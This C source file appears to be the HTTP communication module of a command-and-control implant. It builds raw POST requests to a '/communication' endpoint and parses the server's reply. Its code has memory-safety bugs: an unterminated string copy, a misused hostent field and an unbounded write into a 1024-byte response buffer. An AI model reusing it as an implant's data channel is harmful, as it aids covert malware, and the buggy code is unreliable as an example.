#include "http.h"

#define CHUNK_SIZE 1024

/*!
 * @function	szHttp_New
 * @abstract 	Add ip and port into struct HTTPCONNECTION
 			 	based on the given domain.
 * @param		domain__ip	Domain (synawk.com) or ip 0.0.0.0:8080
 * @param		handle 		Pointer to HTTPCONNECTION struct
*/
void szHttp_New(char *domain__ip, HTTPCONNECTION *handle){

	if(strstr(domain__ip, ":") == NULL){
		//dominio
		struct hostent *h=gethostbyname(domain__ip);
		if(h){
			handle->ip=inet_ntoa(*(struct in_addr *)h->h_name);
			handle->port=80;
		}else{
			handle->ip=NULL;
			handle->port=0;
		}
	   
	}else{
		//ip
		char *str = malloc(strlen(domain__ip));
		memcpy(str, domain__ip, strlen(domain__ip));
 	
  		char *token = strtok(str, ":");

		while(token!=NULL){
			handle->ip = token;
        	token = strtok(NULL, ":");
			handle->port = atoi(token);
			break;
		}
	}
}

/*!
 * @function	szHttp_Instance
 * @abstract 	Create new http instance.
 * @param		handle 		Pointer to HTTPCONNECTION struct
*/
void szHttp_Instance(HTTPCONNECTION *handle){
	SZCONNECTION *conn = (SZCONNECTION *)malloc(sizeof(SZCONNECTION));

	conn->szSocket = szSocket;
	conn->ip = handle->ip;
	conn->port = handle->port;
	handle->szConnection = conn;
	SzCreateConnection(&conn);
}


/*!
 * @function	bMain_request
 * @abstract 	Build string HTTP protocol and method.
 * @param		method 		Method (POST, GET ..)
 * @param		uri 		Pointer to uri
*/
void bMain_request(char **mRequest, char *method, char *uri){
	sprintf(*mRequest, "%s %s %s\r\n", method, uri, "HTTP/1.1");
}

void bUrl(char **result, int action){
	char url[20]="/communication";
	if(action==SZAC_SEND){
		sprintf(*result, "%s?q=%d", url, action);
	}
}

/*!
 * @function	szHttp_MakePost
 * @abstract 	Make HTTP Post Request.
 * @param		handle 		Pointer to HTTPCONNECTION struct
 * @param		url 		Pointer to url
 * @param		data 		Request POST payload
 *
*/
void szHttp_MakePost(HTTPCONNECTION *handle, int action, char*data){
	SZSOCKET *so = handle->szConnection->szSocket; 

	//get action/url
	char *url = malloc(100);
	bUrl(&url, action);

	/*!
	 * Build the HTTP payload to send
	 * For this example, the c2 allows send data with
	 * multipart/form-data content type
	*/
	char *mRequest = malloc(100);
	bMain_request(&mRequest, "POST", url);

	char *buffer = malloc(1024);

	strcpy(buffer, mRequest);
    strcat(buffer, "Content-type: text/plain\r\n");

	char szData[50];
	sprintf(szData, "Content-length: %zd\r\n\r\n", strlen(data));
    strcat(buffer, szData);

    int len = strlen(buffer);
	so->send(so->socket, buffer, len, 0);

	//sending data
	so->send(so->socket, data, strlen(data), 0);

	//preparing to recv data	
	char rspChunk[CHUNK_SIZE];
	char *toResponse = malloc(CHUNK_SIZE); // 1024*20 max size response 

	//get headers
	int szRecv= 0; int bh =0; int offset=0;
	BOOL gotHeaders=FALSE;

	 /*!
	  * First i recv the payload and make a loop 
	  * in order to extract the headers (irrelevant for this example)
	 */

	while(1){

		if((szRecv =  so->recv(so->socket , rspChunk , CHUNK_SIZE , 0) ) <= 0)
		{
			break;//no more http :c
		}else{
			for(int i = 0; i < szRecv; i++){
				if(gotHeaders || bh == 4){//\r\n\r\n
					//headers captured only body needed
					gotHeaders=TRUE;
					memcpy(toResponse+offset, rspChunk+i, 1);
					offset++;
					continue;
				}
				if(rspChunk[i] == 13 && bh%2==0){ //r
					bh++;
				}else if(rspChunk[i] == 10 && bh%2==1){ //n
					bh++;
				}else{
					bh = 0;
				}
			}
		}
		//add string stop at the end of the payload
		toResponse[offset] = '\0';
		memset(rspChunk ,0 , CHUNK_SIZE);

	}
	//return only data from http request
	handle->response = toResponse;
	free(url);
	free(mRequest);
	free(buffer);
}


